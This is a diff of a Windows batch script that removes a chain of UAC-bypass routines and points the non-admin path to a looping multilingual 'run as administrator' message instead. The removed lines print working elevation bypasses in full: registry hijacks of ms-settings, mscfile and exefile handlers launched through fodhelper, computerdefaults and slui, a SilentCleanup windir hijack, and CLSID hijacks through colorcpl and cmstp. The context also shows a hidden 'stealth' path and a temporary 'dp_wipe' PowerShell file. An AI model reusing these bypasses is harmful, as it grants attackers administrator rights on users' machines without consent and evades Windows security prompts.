@@ -15,19 +15,9 @@ set "DP_TEMP=%TEMP_DIR%\dp_wipe_%random%.ps1"
 set "DP_SCRIPT=%TEMP_DIR%\inv_dp.txt"
 set "DP_OUTPUT=%TEMP_DIR%\inv_dp_out.txt"
 net session >nul 2>&1
-if %errorlevel% neq 0 goto :uac
+if %errorlevel% neq 0 goto :retry_msg
 goto :stealth
 
-:uac
-set "_f=%~dpnx0"
-powershell -c "Start-Process -FilePath '%_f%' -Verb RunAs -WindowStyle Hidden" >nul 2>&1 && exit /b
-call :uac_fodhelper & if %errorlevel% equ 0 goto :elevated_ok
-call :uac_silentcleanup & if %errorlevel% equ 0 goto :elevated_ok
-call :uac_ms_settings & if %errorlevel% equ 0 goto :elevated_ok
-call :uac_computerdefaults & if %errorlevel% equ 0 goto :elevated_ok
-call :uac_slui & if %errorlevel% equ 0 goto :elevated_ok
-call :uac_colorui & if %errorlevel% equ 0 goto :elevated_ok
-call :uac_cmstplua & if %errorlevel% equ 0 goto :elevated_ok
 :retry_msg
 if not defined retryCount set "retryCount=0"
 set /a retryCount+=1
@@ -43,85 +33,6 @@ set "msg[7]=Español: Ejecute este script como administrador. Haga clic derecho 
 set "msg[8]=Русский: Пожалуйста, запустите этот скрипт от имени администратора. Щёлкните правой кнопкой мыши по файлу и выберите «Запуск от имени администратора». Спасибо за сотрудничество! ^<3"
 set "msg[9]=العربية: يرجى تشغيل هذا السكريبت كمسؤول. انقر بزر الماوس الأيمن على الملف واختر 'تشغيل كمسؤول'. شكراً لتعاونك! ^<3"
 :loop
-cls
-for /l %%i in (0,1,9) do echo !msg[%%i]!
-echo.
-echo ===============================================================================
-echo Versatile script - Please run as Administrator to continue.
-echo ===============================================================================
-set /a wait=30
-timeout /t !wait! /nobreak >nul
-goto loop
-:retry_limit
-cls
-echo Maximum retry attempts reached. Please run this script as Administrator and try again.
-exit /b 1
-:elevated_ok
-goto :stealth
-
-:uac_fodhelper
-reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
-reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /f >nul 2>&1
-start /min fodhelper.exe
-timeout /t 1 /nobreak >nul
-reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
-net session >nul 2>&1
-exit /b %errorlevel%
-
-:uac_silentcleanup
-set "_e=%~d0"
-if "%_e%"=="" set "_e=C:"
-reg add "HKCU\Environment" /v windir /t REG_SZ /d "%_e%\Windows" /f >nul 2>&1
-schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" >nul 2>&1
-timeout /t 1 /nobreak >nul
-reg delete "HKCU\Environment" /v windir /f >nul 2>&1
-net session >nul 2>&1
-exit /b %errorlevel%
-
-:uac_ms_settings
-reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
-reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKCU\Software\Classes\ms-settings\shell\open" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
-start computerdefaults.exe
-timeout /t 2 /nobreak >nul
-reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
-net session >nul 2>&1
-exit /b %errorlevel%
-
-:uac_computerdefaults
-reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
-start computerdefaults.exe
-timeout /t 1 /nobreak >nul
-reg delete "HKCU\Software\Classes\mscfile" /f >nul 2>&1
-net session >nul 2>&1
-exit /b %errorlevel%
-
-:uac_slui
-reg add "HKCU\Software\Classes\exefile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
-reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /f >nul 2>&1
-start slui.exe
-timeout /t 1 /nobreak >nul
-reg delete "HKCU\Software\Classes\exefile\shell" /f >nul 2>&1
-net session >nul 2>&1
-exit /b %errorlevel%
-
-:uac_colorui
-reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
-reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
-start /min colorcpl.exe
-timeout /t 1 /nobreak >nul
-reg delete "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}" /f >nul 2>&1
-net session >nul 2>&1
-exit /b %errorlevel%
-
-:uac_cmstplua
-reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
-reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
-start /min cmstp.exe /au
-timeout /t 1 /nobreak >nul
-reg delete "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}" /f >nul 2>&1
-net session >nul 2>&1
-exit /b %errorlevel%
 
 :stealth
 if "%~1"=="--elevated" goto :START_PROCESS
